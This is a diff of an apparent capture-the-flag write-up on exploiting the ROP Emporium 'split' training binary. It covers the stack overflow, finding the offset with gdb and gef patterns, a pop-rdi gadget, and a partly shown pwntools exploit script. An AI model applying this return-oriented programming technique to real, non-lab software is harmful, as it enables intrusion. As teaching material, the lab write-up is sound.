@@ -59,15 +59,15 @@ Just like in retwin challenge, we have a 32 byte buffer that can be overflowed w
 ![source-01](/img/Screenshot_2020-05-13_08-34-01.png){: .align-left}
 
 
-This function directly call system with /bin/ls, and there is also usefullstring which /bin/cat flag.txt so we need to return to this function to exploit the binary successfuly. 
-
-Get strings 
+This function directly call system with /bin/ls, and there is also usefullstring which /bin/cat flag.txt so we need to return to this function to exploit the binary successfuly. We can find all the strings in binary using rabin2
 
 ![source-01](/img/Screenshot_2020-05-15_14-55-41.png){: .align-left}
 
+
+
 ## Fuzzing:
-So now the binary analysis is out of the way. Lets start fuzzing the binary.
-Run the program and send more than 40 bytes
+So now the binary analysis is out of the way. Lets start fuzzing the binary.Generate the unique pattern and send to the program.
+
 ```
 gef➤  pattern create 100
 [+] Generating a pattern of 100 bytes
@@ -83,13 +83,16 @@ Contriving a reason to ask user for data...
 
 Program received signal SIGSEGV, Segmentation fault.
 
-```
-As expected the program segfaulted (crashed),we have a valid crash scenario here,but we are not sure if we have overwritten any registers.So lets attach the binary to gdb and analyze the crash.
 
-Attach the binary to GDB using gdb -q splilit
+```
+![source-01](/img/Screenshot_2020-05-09_11-23-21.png){: .align-left}
+
+As expected the program segfaulted (crashed),we have a valid crash scenario here.
+
 
 ###### Calculating offset
-Generate the unique pattern and send to the program
+
+Copy past the generated pattern to the program.
 ```
 gef➤  pattern offset 0x00007fffffffe048
 [+] Searching '0x00007fffffffe048'
@@ -98,16 +101,6 @@ gef➤  pattern offset 0x00007fffffffe048
 gef➤  
 
 ```
-Copy past the generated pattern to the program
-
-
-![source-01](/img/Screenshot_2020-05-15_10-20-53.png){: .align-left}
-
-
-The program has crashed and we have overwritten the rsp,to find the extact offset copy the hex at rsp to the clipboard, then type pattern offset.
-
-
-![source-01](/img/Screenshot_2020-05-09_11-23-21.png){: .align-left}
 
 #### Building ROP-Chain
 
@@ -125,11 +118,6 @@ Lets find the address of pop rdi ret
 ![source-01](/img/Screenshot_2020-05-14_08-23-29.png	){: .align-left}
 
 
-
---------
-Since this challenge only needs 1 argument, we just need to pass the /bin/cat flag.txt string into RDI register. 
-
-------
 #### Exploitation 
 
 Now let’s craft the payload.
@@ -141,7 +129,7 @@ First padding offset to the stack pointer and gadget pop rdi; ret; as the /bin/c
 
 Full exploit using pwntools:
 
-----
+```
  
 #!/usr/bin/python
 from pwn import *
@@ -157,7 +145,9 @@ def main():
    print p.recvall()
  
 if __name__ == "__main__":
-    main() ----
+    main() 
+    
+   ```
 
 
 
